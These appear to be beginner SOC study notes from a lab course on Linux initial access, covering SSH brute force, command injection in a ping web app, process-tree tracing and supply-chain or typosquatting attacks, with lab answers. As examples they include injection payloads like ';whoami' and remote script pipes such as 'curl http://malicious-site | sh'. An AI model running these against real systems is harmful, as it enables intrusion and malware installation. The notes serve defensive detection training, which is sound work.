# SSH Initial Access (Very Easy Notes)

## 1. What is SSH?

SSH means Secure Shell.

It is a tool used to connect to a Linux computer from another computer using the Internet.

Simple example:
You sit at home but control a computer kept in an office.

So,
SSH = Remote control for Linux computers


---

## 2. Why SSH is Popular?

Almost every Linux server uses SSH.

Companies use SSH to:
- manage servers
- fix problems
- install software
- update systems

Because of this,
millions of servers on the Internet have SSH enabled.


---

## 3. Why Attackers Like SSH?

If SSH is open on the Internet,
anyone can try to login.

If security is weak → attacker enters the system.

So SSH becomes an easy entry door.


---

## 4. How Attackers Get Access?

There are mainly TWO ways.


### Method 1: Using Stolen SSH Key

Some admins use a special login file called SSH Key
instead of password.

Problem happens when:
- key is uploaded on GitHub by mistake
- admin laptop gets hacked
- key is stored in unsafe place

If attacker gets the key,
they can login without password.


---

### Method 2: Using Weak Password (Most Common)

Sometimes admins use easy passwords like:
- 123456
- admin
- password

Attackers use automated tools that try
thousands of passwords.

This is called:

SSH Brute Force Attack


---

## 5. What is a Botnet?

Botnet = many hacked computers working together.

These computers:
1. scan the Internet
2. find SSH servers
3. try passwords automatically

No human needed.


---

## 6. Real Attack Example

Many real Linux attacks start like this:

Step 1: Find server with SSH open  
Step 2: Guess password  
Step 3: Login successfully  
Step 4: Install malware or crypto miner  


---

## 7. Advanced Risks (Extra Knowledge)

Sometimes problem is not password.

Examples:
- Bug inside SSH software
- Attacker steals active login session

Even strong passwords may fail.


---

## 8. How SOC Analysts Detect SSH Attacks?

They check login logs.

Warning signs:
- many failed login attempts
- login from unknown country
- login at strange time
- sudden successful login


Important Linux log file:
auth.log


---
## Lab Questions

### Q.1 When did the ubuntu user log in via SSH for the first time?
<img width="1470" height="956" alt="Screenshot 2026-02-23 at 10 30 04 AM" src="https://github.com/user-attachments/assets/a7afd505-c1b6-4f48-95fe-e6a535956e14" />

---
## 9. Quick Revision Table

| Topic | Meaning |
|------|--------|
| SSH | Remote login to Linux |
| Initial Access | First entry into system |
| Weak Password | Easy to guess password |
| SSH Key | Password replacement file |
| Brute Force | Trying many passwords |
| Botnet | Group of hacked computers |


---

## 10. One Line Summary

Most Linux hacks start because SSH is open
and protected by weak passwords or stolen keys.

--- 
# SSH Breach Example (Easy Notes)

## 1. Real World Situation

An IT administrator:

- enabled SSH access on Internet
- allowed password login
- set a weak password for a user

These mistakes together can lead to an SSH hack.


---

## 2. How SSH Breach Happens

Step 1:
Server SSH is open to public Internet.

Step 2:
Attackers scan Internet and find the server.

Step 3:
Attackers try many passwords (Brute Force).

Step 4:
Weak password gets guessed.

Step 5:
Attacker successfully logs in.

This is called an SSH Breach.


---

## 3. Important SSH Log Indicator

During attack logs usually show:

Many failed logins  
followed by  
one successful login

Example pattern:

Failed password  
Failed password  
Failed password  
Accepted password  


---

## 4. Checking Successful SSH Logins

SOC analysts check successful logins using auth logs.

Example log entries:

Accepted publickey for ansible from 10.14.105.255  
Accepted password for jsmith from 54.155.224.201  
Accepted password for jsmith from 196.251.118.184  


---

## 5. Login Analysis

### Login 1 (Likely Normal)

User: ansible  
Authentication: public key  
IP Address: internal network  
Login Time: fixed schedule  

Reason:
Automation systems usually login this way.


---

### Login 2 & 3 (Suspicious)

User: jsmith  
Authentication: password  
IP Address: external Internet IP  
Login Time: unusual timing  

These are possible attacker logins.


---

## 6. Red Flags of Malicious SSH Login

- Password-based authentication
- Login from external IP
- Login at unusual time
- Multiple successful logins from different IPs


---

## 7. SOC Investigation Questions

SOC analyst checks:

1. Username
   - Who owns this account?
   - Is remote login allowed?

2. Source IP
   - Trusted or unknown?
   - Known malicious IP?

3. Login History
   - Were there many failed attempts before login?

4. User Activity After Login
   - New users created?
   - Malware installed?
   - Suspicious commands executed?


---

## 8. Important Rule

Successful login does NOT always mean safe login.

Attackers can login successfully after guessing passwords.


---

## 9. Easy Detection Logic

Normal Login:
Same user + trusted IP + normal timing

Suspicious Login:
External IP + password login + strange timing


---
## Lab Questions 
### Q.1 When did the SSH password brute force start?
<img width="1470" height="956" alt="Screenshot 2026-02-24 at 9 43 30 AM" src="https://github.com/user-attachments/assets/20bcf9c8-6640-4792-b81f-44ae60d4425c" />

### Q.2 Which four users did the botnet attempt to breach?
<img width="1470" height="956" alt="Screenshot 2026-02-24 at 9 40 45 AM" src="https://github.com/user-attachments/assets/dc76af6b-3a3a-44ff-9aad-5a40d9dab310" />


### Q.3 Find which IP successfully logged in as root user.

#### 1. Important Rule

Not every IP in logs is an attacker.

Many IPs only try and fail.


---

#### 2. Failed Login Indicators (Ignore These)

If log shows:

Disconnected from authenticating user  
Connection closed by authenticating user  

Meaning:
- login failed
- password incorrect
- attacker did NOT enter

Ignore these IPs.


---

#### 3. Successful Login Indicators (Very Important)

Real breach happens when log shows:

session opened for user root

OR

Accepted password for root


This means attacker successfully logged in.


---

#### 4. Detection Method

Step 1:
Search for successful root session.

Step 2:
Find line showing:
session opened for user root

Step 3:
Check SSH authentication lines just BEFORE it.

Step 4:
The IP appearing before session open
is the attacker IP.


---

#### 5. Attack Flow in Logs

Failed attempts  
Failed attempts  
Authentication success  
Session opened ✅


---

#### 6. Final Answer Logic

The IP that successfully authenticated
before root session opened
= Breaching IP


Example Answer:
91.224.92.79


---

#### 7. Quick Memory Trick

Ignore:
Disconnected
Connection closed

Focus:
session opened


IP before session opened = Attacker
using command : grep "user root" auth.log
<img width="1470" height="956" alt="Screenshot 2026-02-23 at 10 45 54 AM" src="https://github.com/user-attachments/assets/47d819f5-6069-479c-b652-954a8bb6ba37" />

## 10. One Line Summary

SSH breaches usually happen when weak passwords
allow attackers to login after brute-force attempts.

--- # Linux and Public Services (Easy Notes)

## 1. Important Idea

Linux servers usually run public services such as:

- Web servers
- Email servers
- Databases
- VPN services
- Firewall systems
- IT management tools

If one application is hacked,
the entire Linux system can be compromised.


---

## 2. MITRE Technique

T1190 - Exploit Public-Facing Application

Meaning:
Attackers exploit Internet-facing applications
to gain access to the Linux host.


---

## 3. Real World Attack Examples

### Zimbra Email Vulnerability
Attackers exploited a software bug
and executed operating system commands.

Result:
Server control gained.


### Exposed Docker API
Docker management port exposed to Internet.

Attackers created malicious containers
and compromised cloud infrastructure.


### Firewall Vulnerability
Bug in Linux-based firewall allowed
attackers to gain full system control.


### WordPress Plugin Abuse
Attack Flow:
1. Attacker brute-forces admin login
2. Uploads malicious plugin
3. Plugin installs malware

Result:
Full server compromise.


---

## 4. Application Logs

Applications record their own activity.

Examples:

| Application | Log Type |
|-------------|----------|
| Website | Web logs |
| Database | Database logs |
| VPN | VPN logs |
| Email | Mail logs |

Logs do NOT directly say system is hacked,
but they provide investigation clues.


---

## 5. Web Applications as Initial Access

Public websites are common entry points.

If a web application is vulnerable,
attackers may execute commands on Linux server.


---

## 6. TryPingMe Web Application

Website allows users to ping an IP address.

Server internally runs:

ping -c 2 USER_INPUT

Problem:
No input validation.


---

## 7. Command Injection Attack

Attacker inserts system commands
instead of normal IP address.

Normal request:
ping?host=3.109.33.76

Malicious requests:
ping?host=whoami
ping?host=;whoami
ping?host=;ls


---

## 8. Meaning of Malicious Commands

whoami → shows current system user  
ls → lists system files  

Symbol ";" allows execution of new commands.


---

## 9. Web Log Indicators of Attack

Suspicious behavior includes:

- Commands instead of IP address
- Special characters like ;
- Server errors followed by success responses
- Repeated testing requests


---

## 10. Attacker Identification

Suspicious requests came from:

10.14.105.255

This IP likely executed OS commands
through command injection.


---

## 11. Security Impact

Command injection allows attacker to:

- execute system commands
- access files
- install malware
- gain full system control


---
## Lab Questions

### Q.1 What is the path to the Python file the attacker attempted to open?
<img width="1470" height="427" alt="Screenshot 2026-02-24 at 9 58 39 AM" src="https://github.com/user-attachments/assets/7ffe5c74-5669-4b41-b78a-cd8955444995" />

### Q.2 Looking inside the opened file, what's the flag you see there?

<img width="1450" height="693" alt="Screenshot 2026-02-24 at 9 59 27 AM" src="https://github.com/user-attachments/assets/fc23e032-c758-4590-9209-2703e59c7fe2" />

---
## 12. One Line Summary

A vulnerable public web application can allow
attackers to run system commands and
compromise the entire Linux server.

--- 

# Process Tree Analysis (Linux SOC Notes)

## 1. What is a Process Tree?

A process tree shows:

Which process started another process.

Every process in Linux has:
- PID  → Process ID
- PPID → Parent Process ID

Example:

Application
   ↓
Shell
   ↓
Command


---

## 2. Why SOC Teams Use Process Tree?

Application logs may be missing or unclear.

Process tree helps analysts understand:
- who executed a command
- where it started
- whether access came from a service breach


---

## 3. Common SOC Scenario

Alert received:
Suspicious command executed → whoami

Question:
Was it normal activity or an attack?


---

## 4. Investigation Method

### Step 1: Find Suspicious Command

Search command execution.

Example result:
pid = 3907  
ppid = 3905  

This means:
whoami was started by process 3905.


---

### Step 2: Check Parent Process

Search parent PID.

Result:
 /bin/sh -c whoami

Meaning:
Shell executed the command.


---

### Step 3: Check Grandparent Process

Search next parent PID.

Result:
 /usr/bin/python3 /opt/mywebapp/app.py

Meaning:
A Python web application launched the shell.


---

## 5. Process Tree Example

Python Web App
      ↓
Shell (/bin/sh)
      ↓
whoami

This suggests possible web application exploitation.


---

## 6. Confirming Application Breach

List all child processes of the application.

Suspicious findings:

whoami  
ls -la  
curl http://malicious-site | sh  


---

## 7. Why curl Command is Dangerous?

curl downloads data from Internet.

Command:
curl malicious-site | sh

Meaning:
- download remote script
- execute it immediately

Possible malware installation.


---

## 8. SOC Detection Logic

Suspicious command
        ↓
Trace parent process
        ↓
Reach originating application
        ↓
Check other child processes
        ↓
Confirm breach


---

## 9. Important Concept

If a web application launches system commands,
it may indicate command injection or service compromise.


---
## Lab Questions

### Q.1 What is the PPID of the suspicious whoami command?
<img width="1465" height="218" alt="Screenshot 2026-02-24 at 10 24 03 AM" src="https://github.com/user-attachments/assets/a1ee172d-6124-4184-9882-848e929a1e9c" />

### Q.2 Moving up the tree, what is the PID of the TryPingMe app?
<img width="1465" height="215" alt="Screenshot 2026-02-24 at 10 25 11 AM" src="https://github.com/user-attachments/assets/507f5152-e31b-4060-90fb-dbbea91fe40a" />

### Q.3 Which program did the attacker use to open a reverse shell?

ausearch -i --ppid 577
<img width="1470" height="956" alt="Screenshot 2026-02-24 at 10 27 23 AM" src="https://github.com/user-attachments/assets/b3c3f708-0c2f-49ea-a002-6af2097615a2" />


## 10. One Line Summary

Process tree analysis helps SOC analysts trace
a suspicious command back to its true origin
and identify initial access points.
---

# Human-Led Attacks (Linux Initial Access Notes)

## 1. What are Human-Led Attacks?

Human-led attacks happen when
a person unknowingly executes malicious content.

The attacker tricks the user instead of directly hacking the server.


---

## 2. Why Less Common in Linux?

Linux systems are mostly:
- servers
- managed by IT professionals
- command-line based

So phishing and USB attacks are harder,
but still possible.


---

## 3. Example 1: Malicious Script from Internet

Scenario:
An IT admin searches online for a server fix
and runs this command:

curl https://shadyforum/fix.sh | bash

Problem:
The script content was not checked.

Result:
Malware executed silently on the server.


---

## 4. Example 2: Typo Attack (Typosquatting)

Developer wants to install:

fastapi

But types:

fastpi

Attackers upload fake packages
with similar names.

Result:
Malicious software gets installed.


---

## 5. Supply Chain Compromise

Supply Chain Attack means:

Attacker compromises software first,
then infects all users through updates.

Attack path:

Software compromised
        ↓
Users install update
        ↓
Systems infected


---

## 6. Real World Examples

### XZ Utils Backdoor
A critical Linux library related to SSH
contained a hidden backdoor.

Millions of systems were at risk.


### tj-actions Breach
Developer automation tool compromised.

Result:
- SSH keys leaked
- access tokens exposed
- sensitive secrets stolen


---

## 7. Detecting Human-Led Attacks

SOC teams usually detect attacks using:

Process Tree Analysis


---

## 8. Investigation Method

Step 1:
Receive alert (suspicious command or connection)

Step 2:
Build process tree

Step 3:
Trace command origin

Step 4:
Identify initiating source


---

## 9. Attack Identification Examples

PHP process running whoami
→ Web application attack

Internal service running wget
→ Supply chain compromise

SSH session installing XMrig miner
→ SSH breach

<img width="1377" height="301" alt="Screenshot 2026-02-24 at 10 42 46 AM" src="https://github.com/user-attachments/assets/27dcad41-1c3f-4caf-92a2-fac1c4fecafe" />

---

## 10. Important SOC Concept

Same command can have different meanings.

Investigation depends on:
- parent process
- user session
- application source


---

## 11. One Line Summary

Human mistakes such as running unknown scripts
or installing fake packages can give attackers
initial access to Linux systems.
